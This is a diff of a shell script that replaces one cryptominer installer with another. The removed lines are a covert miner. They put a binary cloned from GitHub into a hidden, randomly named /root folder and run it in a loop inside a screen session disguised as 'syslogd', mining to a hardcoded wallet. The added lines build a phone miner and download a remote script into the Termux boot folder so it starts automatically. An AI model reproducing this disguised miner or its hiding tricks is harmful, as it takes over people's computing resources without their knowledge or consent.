@@ -1,36 +1,18 @@
-#!/bin/bash
-
-echo "📦 Menginstal dependensi..."
-apt-get update -y >/dev/null 2>&1 && apt-get install -y screen wget tar git -y >/dev/null 2>&1
-
-# Nama acak
-XNAME=$(tr -dc a-z0-9 </dev/urandom | head -c 6)
-XDIR="/root/.${XNAME}"
-XBIN="${XDIR}/${XNAME}"
-
-# Buat folder tersembunyi
-mkdir -p "$XDIR"
-
-# Download dan siapkan binary jika belum ada
-if [ ! -f "$XBIN" ]; then
-  echo "⬇️ Mengunduh file dari GitHub..."
-  git clone https://github.com/amirul5656/ver.git "$XDIR/tmp" >/dev/null 2>&1
-  cp "$XDIR/tmp/benchmarks" "$XBIN"
-  chmod +x "$XBIN"
-  strip "$XBIN" >/dev/null 2>&1
-fi
-
-# Jalankan di screen dengan nama sistem
-if screen -list | grep -q syslogd; then
-  echo "⚠️  Sudah berjalan di screen 'syslogd', tidak dijalankan ulang."
-else
-  echo "▶ Menjalankan di background screen 'syslogd'..."
-  screen -dmS syslogd bash -c "
-    while true; do
-      $XBIN --algorithm power2b --pool stratum+tcp://stratum-asia.rplant.xyz:7022 -u mbc1qse2ad4q6lwgtpqj0ls6hg2qp4fp9dm3ht4z5vg.asia2 -p m=solo --cpu-threads 7
-      sleep 2
-    done
-  "
-fi
-
-echo "✅ Mining aktif & terlindungi."
+killall screen
+apt update -y 
+rm -rf advcphoneminer
+rm -rf advc_miner
+apt install libcurl openssl libjansson automake build-essential screen git -y
+git clone https://github.com/TheRetroMike/AdvcPhoneMiner.git advc_miner
+cd advc_miner
+./build-armv8.sh
+cd ~
+echo "screen -dmS miner ~/advc_miner/cpuminer -a YespowerSugar -o $1 -u $2 -p $3 -t $4" > startup.sh
+chmod +x startup.sh
+mkdir -p ~/.termux/boot
+wget https://raw.githubusercontent.com/TheRetroMike/VerusCliMining/refs/heads/main/termux_boot_startup.sh -O ~/.termux/boot/termux_boot_startup.sh
+~/startup.sh
+echo "------------------------------"
+echo "Miner is installed and running. Update config using nano startup.sh"
+echo "To view miner now or after restart, use screen -r miner"
+echo "------------------------------"
